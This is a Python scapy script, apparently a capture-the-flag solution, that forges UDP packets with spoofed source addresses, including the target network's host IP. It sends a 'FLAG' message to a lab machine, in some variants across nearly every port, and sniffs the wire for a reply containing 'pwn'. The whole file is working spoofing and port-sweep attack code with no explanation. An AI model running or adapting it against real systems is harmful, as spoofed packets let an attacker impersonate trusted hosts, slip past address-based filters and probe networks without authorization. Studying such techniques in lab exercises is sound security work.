from scapy.all import *
import threading

DST_IP = "10.0.0.2"
DST_PORT = 31338
MSG = "FLAG"
SRC_IP = "10.0.0.3"
HOST_IP = "10.0.0.1"
SRC_PORT = 31337

def packet_callback(packet):
    try:
        flag = packet[Raw].load.decode("utf-8")
        print(flag)
        if "pwn" in flag:
            print("[+] Quitting...")
            sys.exit(0)
    except Exception as e:
        pass

def monitor():
    sniff(prn=packet_callback, count=-1)

def send_udp_hello(msg, dst_port):
    packet_ = IP(dst=DST_IP, src=SRC_IP)
    datagram_ = packet_/UDP(sport=SRC_PORT, dport=dst_port)
    data = datagram_/msg
    data.show()
    # send(data)
    sendp(Ether()/data, iface="eth0") #best one
    monitor()

def send_udp(msg, dst_port):
    packet_ = IP(dst=DST_IP, src=SRC_IP)
    datagram_ = packet_/UDP(sport=SRC_PORT, dport=dst_port)
    data = datagram_/msg
    sendp(Ether()/data, iface="eth0")

def udp_spoofing1():
    send_udp_hello(MSG, DST_PORT)

def udp_spoofing2():
    msg = ":".join([MSG, SRC_IP, str(SRC_PORT)])
    send_udp_hello(msg, DST_PORT)

def udp_spoofing3():
    msg = ":".join([MSG, SRC_IP, str(SRC_PORT)])
    monitor_thread = threading.Thread(target=monitor)
    monitor_thread.start()
    print("[+] Sending packet")
    for i in range(1, 65535):
        send_udp(msg, i)
    print("[!!] Packet sended")
    monitor_thread.join()

def udp_spoofing4():
    msg = ":".join([MSG, HOST_IP, str(SRC_PORT)])
    monitor_thread = threading.Thread(target=monitor)
    monitor_thread.start()
    print("[+] Sending packet")
    for i in range(1, 65535):
        send_udp(msg, i)
    print("[!!] Packet sended")
    monitor_thread.join()

def main():
    udp_spoofing4()
    return (0)

if __name__ == "__main__":
    main()